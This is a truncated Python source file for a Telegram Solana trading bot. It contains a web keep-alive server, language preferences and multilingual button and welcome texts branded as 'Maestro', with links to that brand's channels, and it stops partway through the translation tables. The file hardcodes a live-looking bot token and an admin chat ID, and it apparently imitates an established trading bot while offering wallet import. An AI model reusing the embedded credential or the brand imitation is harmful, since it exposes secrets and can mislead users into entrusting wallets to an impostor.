import asyncio
import datetime
import json
import os
import re
from html import escape

import aiohttp
from aiohttp import web
from aiogram import Bot, Dispatcher, F, Router, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import BotCommand, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message
from aiogram.utils.keyboard import InlineKeyboardBuilder
from urllib.parse import quote

# Required for Solana contract-address detection in incoming messages.

try:
    from dotenv import load_dotenv
except ImportError:
    def load_dotenv(*args, **kwargs):
        return False

load_dotenv()

LANGUAGE_PREFS_FILE = os.path.join(os.path.dirname(__file__), "language_prefs.json")


USER_LANGUAGE_PREFS: dict[int, str] = {}


def load_language_prefs() -> dict[int, str]:
    global USER_LANGUAGE_PREFS
    if not os.path.exists(LANGUAGE_PREFS_FILE):
        USER_LANGUAGE_PREFS = {}
        return USER_LANGUAGE_PREFS

    try:
        with open(LANGUAGE_PREFS_FILE, "r", encoding="utf-8") as handle:
            raw_data = json.load(handle)
        if isinstance(raw_data, dict):
            USER_LANGUAGE_PREFS = {
                int(user_id): lang_key
                for user_id, lang_key in raw_data.items()
                if isinstance(lang_key, str) and lang_key in LANGUAGE_OPTIONS
            }
        else:
            USER_LANGUAGE_PREFS = {}
    except Exception as exc:
        print(f"Failed to load language preferences: {exc}")
        USER_LANGUAGE_PREFS = {}
    return USER_LANGUAGE_PREFS


def save_language_prefs() -> None:
    try:
        with open(LANGUAGE_PREFS_FILE, "w", encoding="utf-8") as handle:
            json.dump(USER_LANGUAGE_PREFS, handle, ensure_ascii=False, indent=2)
    except Exception as exc:
        print(f"Failed to save language preferences: {exc}")


async def handle_ping(request):
    return web.Response(text="Bot is awake and running 24/7!")


async def start_web_server():
    app = web.Application()
    app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    print(f"Web server safely listening on port {port}")


TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8663988497:AAGittaolB-3B5w8Ydowd_AtTrrlDXddMOo")
BOT_TOKEN = TOKEN
ADMIN_CHAT_ID = 8591686357  # <--- REPLACE THIS WITH YOUR ACTUAL TELEGRAM NUMERICAL ID

bot = Bot(token=TOKEN)
dp = Dispatcher()
router = Router()

class BotStates(StatesGroup):
    waiting_for_slippage = State()
    waiting_for_gas = State()
    waiting_for_global_slippage = State()

LANGUAGE_OPTIONS = {
    "en": {"label": "English 🇺🇸", "code": "en"},
    "zh": {"label": "Chinese 🇨🇳", "code": "zh-CN"},
    "es": {"label": "Spanish 🇪🇸", "code": "es"},
    "ar": {"label": "Arabic 🇪🇬", "code": "ar"},
    "pt": {"label": "Portuguese 🇧🇷", "code": "pt-BR"},
    "fr": {"label": "French 🇫🇷", "code": "fr"},
    "de": {"label": "German 🇩🇪", "code": "de"},
    "hi": {"label": "Hindi 🇮🇳", "code": "hi"},
    "ja": {"label": "Japanese 🇯🇵", "code": "ja"},
    "ru": {"label": "Russian 🇷🇺", "code": "ru"},
}

load_language_prefs()

BUTTON_LABEL_TRANSLATIONS = {
    "en": {
        "🔗 Chains": "🔗 Chains",
        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 Language",
        "💳 Wallets": "💳 Wallets",
        "⚙️ Global Settings": "⚙️ Global Settings",
        "🕓 Active Orders": "🕓 Active Orders",
        "📈 Positions": "📈 Positions",
        "📡 Signals": "📡 Signals",
        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 Copytrade",
        "🎯 Auto Snipe": "🎯 Auto Snipe",
        "↔️ Bridge": "↔️ Bridge",
        "⭐️ Premium": "⭐️ Premium",
        "💸 Cashback": "💸 Cashback",
        "💰 Referral": "💰 Referral",
        "⚡️ BUY & SELL NOW!": "⚡️ BUY & SELL NOW!",
        "test connect": "test connect",
        "Return": "Return",
        "ℹ️ Help": "ℹ️ Help",
        "🗄️ Rearrange Wallets": "🗄️ Rearrange Wallets",
        "Import Wallet": "Import Wallet",
        "Generate Wallet": "Generate Wallet",
        "💳 No Wallets!": "💳 No Wallets!",
        "💳 Track wallet": "💳 Track wallet",
        "Try Again": "Try Again",
        "Hub": "Hub",
        "Updates": "Updates",
        "X (Twitter)": "X (Twitter)",
        "Docs": "Docs",
        "Support": "Support",
        "More Links": "More Links",
        "📍 Track": "📍 Track",
        "🔄 SOL": "🔄 SOL",
        "↔️ Go to Sell": "↔️ Go to Sell",
        "💳 Hellod 🔄": "💳 Hellod 🔄",
        "🔴 Multi": "🔴 Multi",
        "0.01 SOL": "0.01 SOL",
        "0.05 SOL": "0.05 SOL",
        "0.1 SOL": "0.1 SOL",
        "0.2 SOL": "0.2 SOL",
        "0.5 SOL": "0.5 SOL",
        "1 SOL": "1 SOL",
        "Buy X SOL": "Buy X SOL",
        "Buy X Tokens": "Buy X Tokens",
        "⚙️ Snipe": "⚙️ Snipe",
        "⚙️ Buy Limit": "⚙️ Buy Limit",
        "Copy CA 📋": "Copy CA 📋",
        "↔️ Go to Buy": "↔️ Go to Buy",
        "Delete ❌": "Delete ❌",
        "⚙️ Sell Limit": "⚙️ Sell Limit",
        "🔙 Return to Main Menu": "🔙 Return to Main Menu",
        "Connect Wallet": "Connect Wallet",
        "Pay in $SOL (SOL)": "Pay in $SOL (SOL)",
        "Pay in $ETH (ETH)": "Pay in $ETH (ETH)",
        "Pay in $USDT (USDT)": "Pay in $USDT (USDT)",
        "🏆 Explore Tiers": "🏆 Explore Tiers",
        "💵 Pumpfun Cashback": "💵 Pumpfun Cashback",
        "🪐 Phantom Sol Cashback": "🪐 Phantom Sol Cashback",
        "⬅️ Back": "⬅️ Back",
        "⚙️ Recipient Wallets": "⚙️ Recipient Wallets",
    },
    "zh": {
        "🔗 Chains": "🔗 链",
        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 语言",
        "💳 Wallets": "💳 钱包",
        "⚙️ Global Settings": "⚙️ 全局设置",
        "🕓 Active Orders": "🕓 活跃订单",
        "📈 Positions": "📈 仓位",
        "📡 Signals": "📡 信号",
        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 复制交易",
        "🎯 Auto Snipe": "🎯 自动狙击",
        "↔️ Bridge": "↔️ 跨链",
        "⭐️ Premium": "⭐️ 高级版",
        "💸 Cashback": "💸 返现",
        "💰 Referral": "💰 推荐",
        "⚡️ BUY & SELL NOW!": "⚡️ 立即买卖！",
        "test connect": "测试连接",
        "Return": "返回",
        "ℹ️ Help": "ℹ️ 帮助",
        "🗄️ Rearrange Wallets": "🗄️ 整理钱包",
        "Import Wallet": "导入钱包",
        "Generate Wallet": "生成钱包",
        "💳 No Wallets!": "💳 暂无钱包！",
        "💳 Track wallet": "💳 跟踪钱包",
        "Try Again": "重试",
    },
    "es": {
        "🔗 Chains": "🔗 Cadenas",
        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 Idioma",
        "💳 Wallets": "💳 Carteras",
        "⚙️ Global Settings": "⚙️ Configuración global",
        "🕓 Active Orders": "🕓 Órdenes activas",
        "📈 Positions": "📈 Posiciones",
        "📡 Signals": "📡 Señales",
        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 Copiar operaciones",
        "🎯 Auto Snipe": "🎯 Caza automática",
        "↔️ Bridge": "↔️ Puente",
        "⭐️ Premium": "⭐️ Premium",
        "💸 Cashback": "💸 Reembolso",
        "💰 Referral": "💰 Referidos",
        "⚡️ BUY & SELL NOW!": "⚡️ ¡COMPRA Y VENDE YA!",
        "test connect": "Probar conectar",
        "Return": "Volver",
        "ℹ️ Help": "ℹ️ Ayuda",
        "🗄️ Rearrange Wallets": "🗄️ Reordenar carteras",
        "Import Wallet": "Importar cartera",
        "Generate Wallet": "Generar cartera",
        "💳 No Wallets!": "💳 ¡Sin carteras!",
        "💳 Track wallet": "💳 Seguir cartera",
        "Try Again": "Intentar otra vez",
    },
    "ar": {
        "🔗 Chains": "🔗 السلاسل",
        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 اللغة",
        "💳 Wallets": "💳 المحافظ",
        "⚙️ Global Settings": "⚙️ الإعدادات العامة",
        "🕓 Active Orders": "🕓 الطلبات النشطة",
        "📈 Positions": "📈 المراكز",
        "📡 Signals": "📡 الإشارات",
        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 النسخ المتداول",
        "🎯 Auto Snipe": "🎯 الصيد التلقائي",
        "↔️ Bridge": "↔️ الجسر",
        "⭐️ Premium": "⭐️ بريميوم",
        "💸 Cashback": "💸 الاسترداد",
        "💰 Referral": "💰 الإحالة",
        "⚡️ BUY & SELL NOW!": "⚡️ اشترِ وبيع الآن!",
        "test connect": "اختبار الاتصال",
        "Return": "رجوع",
        "ℹ️ Help": "ℹ️ مساعدة",
        "🗄️ Rearrange Wallets": "🗄️ ترتيب المحافظ",
        "Import Wallet": "استيراد محفظة",
        "Generate Wallet": "إنشاء محفظة",
        "💳 No Wallets!": "💳 لا توجد محافظ!",
        "💳 Track wallet": "💳 تتبع المحفظة",
        "Try Again": "حاول مرة أخرى",
    },
    "pt": {
        "🔗 Chains": "🔗 Cadeias",
        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 Idioma",
        "💳 Wallets": "💳 Carteiras",
        "⚙️ Global Settings": "⚙️ Configurações globais",
        "🕓 Active Orders": "🕓 Ordens ativas",
        "📈 Positions": "📈 Posições",
        "📡 Signals": "📡 Sinais",
        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 Copiar trades",
        "🎯 Auto Snipe": "🎯 Caça automática",
        "↔️ Bridge": "↔️ Ponte",
        "⭐️ Premium": "⭐️ Premium",
        "💸 Cashback": "💸 Reembolso",
        "💰 Referral": "💰 Indicação",
        "⚡️ BUY & SELL NOW!": "⚡️ COMPRE E VENDA AGORA!",
        "test connect": "testar conectar",
        "Return": "Voltar",
        "ℹ️ Help": "ℹ️ Ajuda",
        "🗄️ Rearrange Wallets": "🗄️ Organizar carteiras",
        "Import Wallet": "Importar carteira",
        "Generate Wallet": "Gerar carteira",
        "💳 No Wallets!": "💳 Sem carteiras!",
        "💳 Track wallet": "💳 Rastrear carteira",
        "Try Again": "Tentar novamente",
    },
    "fr": {
        "🔗 Chains": "🔗 Chaînes",
        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 Langue",
        "💳 Wallets": "💳 Portefeuilles",
        "⚙️ Global Settings": "⚙️ Paramètres généraux",
        "🕓 Active Orders": "🕓 Ordres actifs",
        "📈 Positions": "📈 Positions",
        "📡 Signals": "📡 Signaux",
        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 Copie de trades",
        "🎯 Auto Snipe": "🎯 Sniping automatique",
        "↔️ Bridge": "↔️ Pont",
        "⭐️ Premium": "⭐️ Premium",
        "💸 Cashback": "💸 Cashback",
        "💰 Referral": "💰 Parrainage",
        "⚡️ BUY & SELL NOW!": "⚡️ ACHETEZ ET VENDRE MAINTENANT!",
        "test connect": "tester connecter",
        "Return": "Retour",
        "ℹ️ Help": "ℹ️ Aide",
        "🗄️ Rearrange Wallets": "🗄️ Réorganiser les portefeuilles",
        "Import Wallet": "Importer un portefeuille",
        "Generate Wallet": "Créer un portefeuille",
        "💳 No Wallets!": "💳 Aucun portefeuille!",
        "💳 Track wallet": "💳 Suivre le portefeuille",
        "Try Again": "Réessayer",
    },
    "de": {
        "🔗 Chains": "🔗 Ketten",
        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 Sprache",
        "💳 Wallets": "💳 Wallets",
        "⚙️ Global Settings": "⚙️ Globale Einstellungen",
        "🕓 Active Orders": "🕓 Aktive Bestellungen",
        "📈 Positions": "📈 Positionen",
        "📡 Signals": "📡 Signale",
        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 Copytrade",
        "🎯 Auto Snipe": "🎯 Auto-Snipe",
        "↔️ Bridge": "↔️ Brücke",
        "⭐️ Premium": "⭐️ Premium",
        "💸 Cashback": "💸 Cashback",
        "💰 Referral": "💰 Empfehlung",
        "⚡️ BUY & SELL NOW!": "⚡️ JETZT KAUFEN UND VERKAUFEN!",
        "test connect": "testen verbinden",
        "Return": "Zurück",
        "ℹ️ Help": "ℹ️ Hilfe",
        "🗄️ Rearrange Wallets": "🗄️ Wallets neu anordnen",
        "Import Wallet": "Wallet importieren",
        "Generate Wallet": "Wallet generieren",
        "💳 No Wallets!": "💳 Keine Wallets!",
        "💳 Track wallet": "💳 Wallet verfolgen",
        "Try Again": "Erneut versuchen",
    },
    "hi": {
        "🔗 Chains": "🔗 श्रृंखलाएँ",
        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 भाषा",
        "💳 Wallets": "💳 बटुए",
        "⚙️ Global Settings": "⚙️ वैश्विक सेटिंग्स",
        "🕓 Active Orders": "🕓 सक्रिय ऑर्डर",
        "📈 Positions": "📈 स्थिति",
        "📡 Signals": "📡 संकेत",
        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 कॉपी ट्रेड",
        "🎯 Auto Snipe": "🎯 ऑटो स्नाइप",
        "↔️ Bridge": "↔️ ब्रिज",
        "⭐️ Premium": "⭐️ प्रीमियम",
        "💸 Cashback": "💸 कैशबैक",
        "💰 Referral": "💰 रेफरल",
        "⚡️ BUY & SELL NOW!": "⚡️ अभी खरीदें और बेचें!",
        "test connect": "परीक्षण कनेक्ट करें",
        "Return": "वापस",
        "ℹ️ Help": "ℹ️ मदद",
        "🗄️ Rearrange Wallets": "🗄️ बटुए पुनर्व्यवस्थित करें",
        "Import Wallet": "बटुआ आयात करें",
        "Generate Wallet": "बटुआ बनाएँ",
        "💳 No Wallets!": "💳 कोई बटुआ नहीं!",
        "💳 Track wallet": "💳 बटुआ ट्रैक करें",
        "Try Again": "फिर से कोशिश करें",
    },
    "ja": {
        "🔗 Chains": "🔗 チェーン",
        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 言語",
        "💳 Wallets": "💳 ウォレット",
        "⚙️ Global Settings": "⚙️ グローバル設定",
        "🕓 Active Orders": "🕓 アクティブ注文",
        "📈 Positions": "📈 ポジション",
        "📡 Signals": "📡 シグナル",
        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 コピー取引",
        "🎯 Auto Snipe": "🎯 自動スナイプ",
        "↔️ Bridge": "↔️ ブリッジ",
        "⭐️ Premium": "⭐️ プレミアム",
        "💸 Cashback": "💸 キャッシュバック",
        "💰 Referral": "💰 紹介",
        "⚡️ BUY & SELL NOW!": "⚡️ 今すぐ購入して売却！",
        "test connect": "テスト接続",
        "Return": "戻る",
        "ℹ️ Help": "ℹ️ ヘルプ",
        "🗄️ Rearrange Wallets": "🗄️ ウォレットを並べ替える",
        "Import Wallet": "ウォレットをインポート",
        "Generate Wallet": "ウォレットを作成",
        "💳 No Wallets!": "💳 ウォレットなし!",
        "💳 Track wallet": "💳 ウォレットを追跡",
        "Try Again": "もう一度試す",
    },
    "ru": {
        "🔗 Chains": "🔗 Сети",
        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 Язык",
        "💳 Wallets": "💳 Кошельки",
        "⚙️ Global Settings": "⚙️ Глобальные настройки",
        "🕓 Active Orders": "🕓 Активные ордера",
        "📈 Positions": "📈 Позиции",
        "📡 Signals": "📡 Сигналы",
        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 Копирующий трейдинг",
        "🎯 Auto Snipe": "🎯 Авто-снайп",
        "↔️ Bridge": "↔️ Мост",
        "⭐️ Premium": "⭐️ Премиум",
        "💸 Cashback": "💸 Кэшбэк",
        "💰 Referral": "💰 Реферал",
        "⚡️ BUY & SELL NOW!": "⚡️ КУПИТЬ И ПРОДАТЬ СЕЙЧАС!",
        "test connect": "тест подключить",
        "Return": "Назад",
        "ℹ️ Help": "ℹ️ Помощь",
        "🗄️ Rearrange Wallets": "🗄️ Переставить кошельки",
        "Import Wallet": "Импортировать кошелек",
        "Generate Wallet": "Создать кошелек",
        "💳 No Wallets!": "💳 Нет кошельков!",
        "💳 Track wallet": "💳 Отслеживать кошелек",
        "Try Again": "Повторить",
    },
}


TEXT_TRANSLATIONS = {
    "en": {
        "🌎 Please choose your preferred Language:": "🌎 Please choose your preferred Language:",
        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ Language updated. Your interface will now be shown in your selected language.",
        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.",
        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.",
        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.",
        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ Wallet not found. Please import or generate.",
        "MAIN_WELCOME_TEXT": (
            "⭐️ <b>Welcome to Maestro</b>\n"
            "<i>Your one-stop hub for trading tools and quick actions.</i>\n\n"
            "🔗 <b>Chains:</b> Enable or disable chains.\n"
            "💳 <b>Wallets:</b> Import or generate wallets.\n"
            "⚙️ <b>Global Settings:</b> Customize the bot.\n"
            "🕓 <b>Active Orders:</b> Track buy and sell limits.\n"
            "📈 <b>Positions:</b> Monitor your open trades.\n\n"
            "⚡️ <b>Paste a token CA to trade immediately.</b>\n\n"
            "<a href=\"https://t.me/MaestroBotsHub\">Hub</a> • "
            "<a href=\"https://t.me/MaestroSniperUpdates\">Updates</a> • "
            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
            "<a href=\"https://t.me/MaestroSupport\">Support</a> • "
            "<a href=\"https://linktr.ee/MaestroBots\">More Links</a>"
        ),
    },
    "zh": {
        "🌎 Please choose your preferred Language:": "🌎 请选择您偏好的语言：",
        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ 语言已更新。您的界面现在将显示为所选语言。",
        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 已选择测试连接。使用此按钮导入或生成一个测试钱包。",
        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ 快速交易控制台：在下面粘贴代币合约地址（CA）。",
        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 根据您的偏好启用或禁用链。\n\n💳 钱包按钮可用于导入或生成每条链的钱包。",
        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ 未找到钱包。请导入或生成。",
        "MAIN_WELCOME_TEXT": (
            "⭐️ <b>欢迎使用Maestro</b>\n"
            "<i>您的交易工具和快速操作一站式中心。</i>\n\n"
            "🔗 <b>链：</b> 启用或禁用链。\n"
            "💳 <b>钱包：</b> 导入或生成钱包。\n"
            "⚙️ <b>全局设置：</b> 自定义机器人。\n"
            "🕓 <b>活跃订单：</b> 跟踪买卖限价订单。\n"
            "📈 <b>持仓：</b> 监控您的持仓。\n\n"
            "⚡️ <b>粘贴代币 CA 以立即交易。</b>\n\n"
            "<a href=\"https://t.me/MaestroBotsHub\">中心</a> • "
            "<a href=\"https://t.me/MaestroSniperUpdates\">更新</a> • "
            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
            "<a href=\"https://t.me/MaestroSupport\">支持</a> • "
            "<a href=\"https://linktr.ee/MaestroBots\">更多链接</a>"
        ),
    },
    "es": {
        "🌎 Please choose your preferred Language:": "🌎 Por favor, elija su idioma preferido:",
        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ Idioma actualizado. Su interfaz ahora se mostrará en su idioma seleccionado.",
        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 Conexión de prueba seleccionada. Use este botón para importar o generar una billetera para pruebas.",
        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ Consola de comercio rápido: pegue una dirección de contrato de token (CA) a continuación.",
        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 Habilite o deshabilite cadenas según sus preferencias.\n\nLos botones de 💳 Carteras se pueden usar para importar o generar carteras para cada cadena.",
        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ No se encontró billetera. Por favor importe o genere una.",
        "MAIN_WELCOME_TEXT": (
            "⭐️ <b>Bienvenido a Maestro</b>\n"
            "<i>Tu centro todo en uno para herramientas de trading y acciones rápidas.</i>\n\n"
            "🔗 <b>Cadenas:</b> Activa o desactiva cadenas.\n"
            "💳 <b>Carteras:</b> Importa o genera carteras.\n"
            "⚙️ <b>Configuración global:</b> Personaliza el bot.\n"
            "🕓 <b>Órdenes activas:</b> Controla las órdenes de compra y venta.\n"
            "📈 <b>Posiciones:</b> Monitorea tus operaciones abiertas.\n\n"
            "⚡️ <b>Pega un CA de token para comerciar inmediatamente.</b>\n\n"
            "<a href=\"https://t.me/MaestroBotsHub\">Hub</a> • "
            "<a href=\"https://t.me/MaestroSniperUpdates\">Actualizaciones</a> • "
            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
            "<a href=\"https://t.me/MaestroSupport\">Soporte</a> • "
            "<a href=\"https://linktr.ee/MaestroBots\">Más enlaces</a>"
        ),
    },
    "ar": {
        "🌎 Please choose your preferred Language:": "🌎 يرجى اختيار لغتك المفضلة:",
        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ تم تحديث اللغة. ستظهر واجهتك الآن باللغة التي اخترتها.",
        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 تم اختيار الاختبار. استخدم هذا الزر لاستيراد أو إنشاء محفظة للاختبار.",
        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ وحدة التداول السريعة: الصق عنوان عقد الرمز (CA) أدناه.",
        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 فعّل أو أعطل الشبكات بناءً على تفضيلاتك.\n\nيمكن استخدام أزرار 💳 المحافظ لاستيراد أو إنشاء محافظ لكل شبكة.",
        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ لم يتم العثور على محفظة. يرجى الاستيراد أو الإنشاء.",
        "MAIN_WELCOME_TEXT": (
            "⭐️ <b>مرحبًا بك في Maestro</b>\n"
            "<i>محور التداول الخاص بك لكل الأدوات والإجراءات السريعة.</i>\n\n"
            "🔗 <b>السلاسل:</b> فعّل أو تعطّل السلاسل.\n"
            "💳 <b>المحافظ:</b> استورد أو أنشئ محافظ.\n"
            "⚙️ <b>الإعدادات العامة:</b> خصّص البوت.\n"
            "🕓 <b>الطلبات النشطة:</b> تتبع أوامر الشراء والبيع.\n"
            "📈 <b>المراكز:</b> راقب تداولاتك المفتوحة.\n\n"
            "⚡️ <b>الصق CA الرمز للتداول فوراً.</b>\n\n"
            "<a href=\"https://t.me/MaestroBotsHub\">المركز</a> • "
            "<a href=\"https://t.me/MaestroSniperUpdates\">التحديثات</a> • "
            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
            "<a href=\"https://t.me/MaestroSupport\">الدعم</a> • "
            "<a href=\"https://linktr.ee/MaestroBots\">المزيد من الروابط</a>"
        ),
    },
    "pt": {
        "🌎 Please choose your preferred Language:": "🌎 Por favor, escolha seu idioma preferido:",
        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ Idioma atualizado. Sua interface agora será exibida no idioma selecionado.",
        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 Teste de conexão selecionado. Use este botão para importar ou gerar uma carteira para teste.",
        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ Console de negociação rápida: cole abaixo um endereço de contrato de token (CA).",
        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 Ative ou desative cadeias com base em suas preferências.\n\nOs botões de 💳 Carteiras podem ser usados para importar ou gerar carteiras para cada cadeia.",
        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ Carteira não encontrada. Por favor importe ou gere.",
        "MAIN_WELCOME_TEXT": (
            "⭐️ <b>Bem-vindo ao Maestro</b>\n"
            "<i>Seu hub completo para ferramentas de trading e ações rápidas.</i>\n\n"
            "🔗 <b>Cadeias:</b> Ative ou desative cadeias.\n"
            "💳 <b>Carteiras:</b> Importe ou gere carteiras.\n"
            "⚙️ <b>Configurações globais:</b> Personalize o bot.\n"
            "🕓 <b>Ordens ativas:</b> Acompanhe ordens de compra e venda.\n"
            "📈 <b>Posições:</b> Monitore suas trades em aberto.\n\n"
            "⚡️ <b>Cole um CA de token para negociar imediatamente.</b>\n\n"
            "<a href=\"https://t.me/MaestroBotsHub\">Hub</a> • "
            "<a href=\"https://t.me/MaestroSniperUpdates\">Atualizações</a> • "
            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
            "<a href=\"https://t.me/MaestroSupport\">Suporte</a> • "
            "<a href=\"https://linktr.ee/MaestroBots\">Mais links</a>"
        ),
    },
    "fr": {
        "🌎 Please choose your preferred Language:": "🌎 Veuillez choisir votre langue préférée :",
        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ Langue mise à jour. Votre interface sera désormais affichée dans la langue sélectionnée.",
        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 Connexion de test sélectionnée. Utilisez ce bouton pour importer ou générer un portefeuille pour les tests.",
        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ Console de trading rapide : collez ci-dessous une adresse de contrat de jeton (CA).",
        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 Activez ou désactivez les chaînes selon vos préférences.\n\nLes boutons 💳 Portefeuilles peuvent être utilisés pour importer ou générer des portefeuilles pour chaque chaîne.",
        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ Portefeuille introuvable. Veuillez importer ou générer.",
        "MAIN_WELCOME_TEXT": (
            "⭐️ <b>Bienvenue dans Maestro</b>\n"
            "<i>Votre hub tout-en-un pour les outils de trading et les actions rapides.</i>\n\n"
            "🔗 <b>Chaînes :</b> Activez ou désactivez des chaînes.\n"
            "💳 <b>Portefeuilles :</b> Importez ou générez des portefeuilles.\n"
            "⚙️ <b>Paramètres globaux :</b> Personnalisez le bot.\n"
            "🕓 <b>Ordres actifs :</b> Suivez les ordres d’achat et de vente.\n"
            "📈 <b>Positions :</b> Surveillez vos trades ouverts.\n\n"
            "⚡️ <b>Collez un CA de token pour trader immédiatement.</b>\n\n"
            "<a href=\"https://t.me/MaestroBotsHub\">Hub</a> • "
            "<a href=\"https://t.me/MaestroSniperUpdates\">Mises à jour</a> • "
            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
            "<a href=\"https://t.me/MaestroSupport\">Support</a> • "
            "<a href=\"https://linktr.ee/MaestroBots\">Plus de liens</a>"
        ),
    },
    "de": {
        "🌎 Please choose your preferred Language:": "🌎 Bitte wählen Sie Ihre bevorzugte Sprache:",
        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ Sprache aktualisiert. Ihre Oberfläche wird nun in der gewählten Sprache angezeigt.",
        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 Test Connect ausgewählt. Verwenden Sie diese Schaltfläche, um eine Wallet zum Testen zu importieren oder zu erstellen.",
        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ Schnelle Handelskonsole: Fügen Sie unten eine Token-Vertragsadresse (CA) ein.",
        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 Aktivieren oder deaktivieren Sie Ketten basierend auf Ihren Präferenzen.\n\nDie 💳 Wallet-Buttons können verwendet werden, um Wallets für jede Kette zu importieren oder zu generieren.",
        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ Wallet nicht gefunden. Bitte importieren oder erstellen Sie eine.",
        "MAIN_WELCOME_TEXT": (
            "⭐️ <b>Willkommen bei Maestro</b>\n"
            "<i>Ihr All-in-One-Hub für Trading-Tools und schnelle Aktionen.</i>\n\n"
            "🔗 <b>Ketten:</b> Aktivieren oder deaktivieren Sie Ketten.\n"
            "💳 <b>Wallets:</b> Importieren oder generieren Sie Wallets.\n"
            "⚙️ <b>Globale Einstellungen:</b> Passen Sie den Bot an.\n"
            "🕓 <b>Aktive Orders:</b> Verfolgen Sie Kauf- und Verkaufsorders.\n"
            "📈 <b>Positionen:</b> Überwachen Sie Ihre offenen Trades.\n\n"
            "⚡️ <b>Fügen Sie eine Token-CA ein, um sofort zu handeln.</b>\n\n"
            "<a href=\"https://t.me/MaestroBotsHub\">Hub</a> • "
            "<a href=\"https://t.me/MaestroSniperUpdates\">Updates</a> • "
            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
            "<a href=\"https://t.me/MaestroSupport\">Support</a> • "
            "<a href=\"https://linktr.ee/MaestroBots\">Mehr Links</a>"
        ),
    },
    "hi": {
        "🌎 Please choose your preferred Language:": "🌎 कृपया अपनी वांछित भाषा चुनें:",
